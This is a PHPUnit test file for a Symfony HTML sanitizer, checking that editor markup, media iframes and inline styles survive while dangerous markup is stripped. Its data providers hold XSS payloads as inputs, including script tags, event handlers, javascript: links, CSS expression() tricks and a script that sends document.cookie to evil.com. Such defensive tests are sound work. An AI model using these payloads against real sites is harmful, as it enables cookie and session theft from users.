<?php

namespace App\Tests\Twig;

use PHPUnit\Framework\Attributes\DataProvider;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerInterface;

class HtmlSanitizerTest extends KernelTestCase
{
    private HtmlSanitizerInterface $sanitizer;

    protected function setUp(): void
    {
        self::bootKernel();
        $this->sanitizer = self::getContainer()->get('html_sanitizer.sanitizer.app.content_sanitizer');
    }

    #[DataProvider('safeHtmlProvider')]
    public function testAllowsSafeHtml(string $input, string $expected): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertSame($expected, $result);
    }

    public static function safeHtmlProvider(): array
    {
        return [
            'paragraph' => [
                '<p>Hello World</p>',
                '<p>Hello World</p>',
            ],
            'bold and italic' => [
                '<p><strong>Bold</strong> and <em>italic</em></p>',
                '<p><strong>Bold</strong> and <em>italic</em></p>',
            ],
            'headings' => [
                '<h1>Title</h1><h2>Subtitle</h2>',
                '<h1>Title</h1><h2>Subtitle</h2>',
            ],
            'lists' => [
                '<ul><li>Item 1</li><li>Item 2</li></ul>',
                '<ul><li>Item 1</li><li>Item 2</li></ul>',
            ],
            'link with safe attributes' => [
                '<a href="https://example.com" title="Example">Link</a>',
                '<a href="https://example.com" title="Example">Link</a>',
            ],
            'link with relative path' => [
                '<a href="/ftp/user/4896/files/revue-alpine-665.pdf"><strong>Afficher le n° 665</strong></a>',
                '<a href="/ftp/user/4896/files/revue-alpine-665.pdf"><strong>Afficher le n° 665</strong></a>',
            ],
            'link with relative path without leading slash' => [
                '<a href="ftp/user/1161/files/revuealpine202101651.pdf">Afficher le n° 651</a>',
                '<a href="ftp/user/1161/files/revuealpine202101651.pdf">Afficher le n° 651</a>',
            ],
            'image with safe attributes' => [
                '<img src="https://www.youtube.com/image.jpg" alt="Image" width="100" height="100">',
                '<img src="https://www.youtube.com/image.jpg" alt="Image" width="100" height="100" />',
            ],
            // Depuis Symfony 7.4 sous PHP 8.4+, le sanitizer analyse avec le parseur HTML5 natif,
            // qui insère le <tbody> implicite comme le font les navigateurs.
            'table' => [
                '<table><tr><th>Header</th></tr><tr><td>Cell</td></tr></table>',
                '<table><tbody><tr><th>Header</th></tr><tr><td>Cell</td></tr></tbody></table>',
            ],
            'blockquote' => [
                '<blockquote>Quote</blockquote>',
                '<blockquote>Quote</blockquote>',
            ],
            'data base64 in img' => [
                '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYcAAAD" />',
                '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYcAAAD" />',
            ],
        ];
    }

    #[DataProvider('dangerousHtmlProvider')]
    public function testRemovesDangerousHtml(string $input, string $expected): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertSame($expected, $result);
    }

    public static function dangerousHtmlProvider(): array
    {
        return [
            'script tag' => [
                '<p>Hello</p><script>alert("xss")</script>',
                '<p>Hello</p>',
            ],
            'onclick attribute' => [
                '<p onclick="alert(\'xss\')">Click me</p>',
                '<p>Click me</p>',
            ],
            'onerror on img' => [
                '<img src="x" onerror="alert(\'xss\')">',
                '<img src="x" />', // src="x" is kept (relative path allowed), onerror is removed
            ],
            'javascript href' => [
                '<a href="javascript:alert(\'xss\')">Click</a>',
                '<a>Click</a>',
            ],
            'style tag' => [
                '<style>body { display: none; }</style><p>Text</p>',
                '<p>Text</p>',
            ],
            'onmouseover' => [
                '<div onmouseover="alert(\'xss\')">Hover</div>',
                '<div>Hover</div>',
            ],
            'data script in img' => [
                '<img src="data:text/html,<script>alert(\'xss\')</script>">',
                '<img />',
            ],
            'form tag' => [
                '<form action="/steal"><input type="text"></form>',
                '',
            ],
            'object tag' => [
                '<object data="malicious.swf"></object>',
                '',
            ],
            'embed tag' => [
                '<embed src="malicious.swf">',
                '',
            ],
        ];
    }

    #[DataProvider('youtubeIframeProvider')]
    public function testAllowsYoutubeIframes(string $input): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('youtube', $result);
    }

    public static function youtubeIframeProvider(): array
    {
        return [
            'youtube.com' => [
                '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" allowfullscreen></iframe>',
            ],
            'youtube-nocookie.com' => [
                '<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ" width="560" height="315"></iframe>',
            ],
        ];
    }

    #[DataProvider('vimeoIframeProvider')]
    public function testAllowsVimeoIframes(string $input): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('vimeo', $result);
    }

    public static function vimeoIframeProvider(): array
    {
        return [
            'player.vimeo.com' => [
                '<iframe src="https://player.vimeo.com/video/123456789" width="640" height="360"></iframe>',
            ],
        ];
    }

    public function testBlocksUnauthorizedIframes(): void
    {
        $input = '<iframe src="https://malicious-site.com/embed"></iframe>';
        $result = $this->sanitizer->sanitize($input);
        // The iframe tag is kept but the malicious src is cleared
        $this->assertStringNotContainsString('malicious-site.com', $result);
        $this->assertStringContainsString('<iframe', $result);
    }

    public function testBlocksHttpIframes(): void
    {
        // HTTP (non-HTTPS) should be blocked
        $input = '<iframe src="http://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>';
        $result = $this->sanitizer->sanitize($input);
        // The HTTP URL should not appear in the result
        $this->assertStringNotContainsString('http://www.youtube.com', $result);
    }

    public function testPreservesComplexArticleContent(): void
    {
        $input = <<<HTML
<h1>Article Title</h1>
<p>This is a <strong>bold</strong> statement with a <a href="https://example.com">link</a>.</p>
<img src="https://example.com/photo.jpg" alt="Photo" width="800">
<h2>Video Section</h2>
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" allowfullscreen></iframe>
<ul>
    <li>First item</li>
    <li>Second item</li>
</ul>
<blockquote>A famous quote</blockquote>
HTML;

        $result = $this->sanitizer->sanitize($input);

        $this->assertStringContainsString('<h1>Article Title</h1>', $result);
        $this->assertStringContainsString('<strong>bold</strong>', $result);
        $this->assertStringContainsString('<a href="https://example.com">link</a>', $result);
        $this->assertStringContainsString('<img', $result);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('youtube.com', $result);
        $this->assertStringContainsString('<ul>', $result);
        $this->assertStringContainsString('<blockquote>', $result);
    }

    public function testSanitizesArticleWithXssAttempt(): void
    {
        $input = <<<HTML
<h1>Normal Title</h1>
<p>Normal paragraph</p>
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
<img src="x" onerror="alert('xss')">
<a href="javascript:alert('xss')">Malicious Link</a>
<p onclick="stealData()">Clickjacking attempt</p>
HTML;

        $result = $this->sanitizer->sanitize($input);

        // Safe content preserved
        $this->assertStringContainsString('<h1>Normal Title</h1>', $result);
        $this->assertStringContainsString('<p>Normal paragraph</p>', $result);

        // Dangerous content removed
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('stealData', $result);
    }

    public function testPreservesSiteImages(): void
    {
        // Use localhost as it's the BACKEND_URL host in test environment
        $input = '<figure class="image image_resized" style="width:49.71%;"><img style="aspect-ratio:1999/2999;" src="https://localhost/ftp/uploads/files/photo.jpg" width="1999" height="2999"></figure>';

        $result = $this->sanitizer->sanitize($input);

        // Figure tag with class and style preserved
        $this->assertStringContainsString('<figure', $result);
        $this->assertStringContainsString('class="image image_resized"', $result);
        $this->assertStringContainsString('style="width:49.71%;"', $result);

        // Image tag with all attributes preserved
        $this->assertStringContainsString('<img', $result);
        $this->assertStringContainsString('src="https://localhost/ftp/uploads/files/photo.jpg"', $result);
        $this->assertStringContainsString('style="aspect-ratio:1999/2999;"', $result);
        $this->assertStringContainsString('width="1999"', $result);
        $this->assertStringContainsString('height="2999"', $result);
    }

    public function testAllowsExternalImages(): void
    {
        // External HTTPS images from any domain should be allowed
        $input = '<img src="https://some-external-site.com/photo.jpg" alt="External photo">';
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringContainsString('src="https://some-external-site.com/photo.jpg"', $result);
    }

    #[DataProvider('editorInlineFormattingProvider')]
    public function testPreservesEditorInlineFormatting(string $input, string $expected): void
    {
        $this->assertSame($expected, $this->sanitizer->sanitize($input));
    }

    public static function editorInlineFormattingProvider(): array
    {
        return [
            'taille de police' => [
                '<p><span style="font-size:20px;">Grand texte</span></p>',
                '<p><span style="font-size:20px;">Grand texte</span></p>',
            ],
            'couleur du texte' => [
                '<p><span style="color:hsl(0, 75%, 60%);">Rouge</span></p>',
                '<p><span style="color:hsl(0, 75%, 60%);">Rouge</span></p>',
            ],
            'couleur de fond' => [
                '<p><span style="background-color:#e6e64d;">Fond jaune</span></p>',
                '<p><span style="background-color:#e6e64d;">Fond jaune</span></p>',
            ],
            'police' => [
                '<p><span style="font-family:\'Courier New\', Courier, monospace;">Code</span></p>',
                '<p><span style="font-family:&#039;Courier New&#039;, Courier, monospace;">Code</span></p>',
            ],
            'plusieurs formats combinés' => [
                '<p><span style="background-color:rgb(255, 255, 0);color:#000000;font-size:12px;">Mix</span></p>',
                '<p><span style="background-color:rgb(255, 255, 0);color:#000000;font-size:12px;">Mix</span></p>',
            ],
            'surlignage' => [
                '<p><mark class="marker-yellow">Surligné</mark> et <mark class="pen-red">stylo</mark></p>',
                '<p><mark class="marker-yellow">Surligné</mark> et <mark class="pen-red">stylo</mark></p>',
            ],
            'titres et gras inchangés' => [
                '<h2>Titre</h2><p><strong>Gras</strong><br />Ligne</p>',
                '<h2>Titre</h2><p><strong>Gras</strong><br />Ligne</p>',
            ],
        ];
    }

    #[DataProvider('dangerousInlineFormattingProvider')]
    public function testRemovesDangerousInlineFormatting(string $input, string $expected): void
    {
        $this->assertSame($expected, $this->sanitizer->sanitize($input));
    }

    public static function dangerousInlineFormattingProvider(): array
    {
        return [
            'propriété CSS non autorisée' => [
                '<span style="position:fixed;top:0;color:red;">Texte</span>',
                '<span style="color:red;">Texte</span>',
            ],
            'url() dans le fond' => [
                '<span style="background-color:url(https://evil.example/x.png);">Texte</span>',
                '<span>Texte</span>',
            ],
            'background raccourci avec url()' => [
                '<span style="background:url(javascript:alert(1));">Texte</span>',
                '<span>Texte</span>',
            ],
            'expression()' => [
                '<span style="color:expression(alert(1));">Texte</span>',
                '<span>Texte</span>',
            ],
            'échappement CSS' => [
                '<span style="color:\\72 ed;">Texte</span>',
                '<span>Texte</span>',
            ],
            'var() et taille démesurée' => [
                '<span style="color:var(--x);font-size:99999px;">Texte</span>',
                '<span>Texte</span>',
            ],
            'classe de surlignage inconnue' => [
                '<mark class="marker-yellow hidden admin-only">Texte</mark>',
                '<mark class="marker-yellow">Texte</mark>',
            ],
            'surlignage sans classe valide' => [
                '<mark class="evil">Texte</mark>',
                '<mark>Texte</mark>',
            ],
            'événement sur span' => [
                '<span style="color:red;" onmouseover="alert(1)">Texte</span>',
                '<span style="color:red;">Texte</span>',
            ],
        ];
    }

    public function testBlocksHttpImages(): void
    {
        // HTTP images should be blocked (only HTTPS allowed)
        $input = '<img src="http://external-site.com/photo.jpg" alt="HTTP photo">';
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringNotContainsString('http://external-site.com', $result);
    }
}
